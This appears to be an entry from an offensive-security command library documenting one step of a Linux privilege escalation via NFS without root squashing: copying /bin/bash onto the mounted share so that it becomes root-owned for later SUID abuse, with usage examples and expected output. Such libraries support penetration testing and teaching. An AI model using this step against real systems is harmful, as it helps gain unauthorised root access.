---
id: 723fc840-247b-4afb-be6e-5255fb996bd6
name: cp-copy-bash-to-mount-dir
type: command
executor: bash
data: cp /bin/bash $_MOUNT_POINT/bash
output: null
created_at: '2023-04-06T03:56:19.323222+00:00'
updated_at: '2023-04-10T20:34:35.902057+00:00'
platforms:
  - Linux
tags:
  - nfs
  - privilege-escalation
verified: true
validated: true
---

# cp-copy-bash-to-mount-dir

## Command

```bash
cp /bin/bash $_MOUNT_POINT/bash
```

## Description

This command copies the system's bash binary to the NFS-mounted directory. In a vulnerable setup, the copy will be owned by root, enabling SUID exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_MOUNT_POINT | Path to the mounted NFS directory | Yes |
| /bin/bash | Source bash binary (fixed) | Yes |

## Examples

### Basic Usage

```bash
cp /bin/bash /tmp/nfsdir/bash
```

### Advanced Usage

```bash
cp -p /bin/bash /tmp/nfsdir/bash
```

## Expected Output

```
(Silent if successful; ls -l $_MOUNT_POINT/bash shows root ownership in vulnerable configs)
```

## Related

- [[procedures/Linux-Privilege-Escalation-via-NFS-Root-Squashing]]
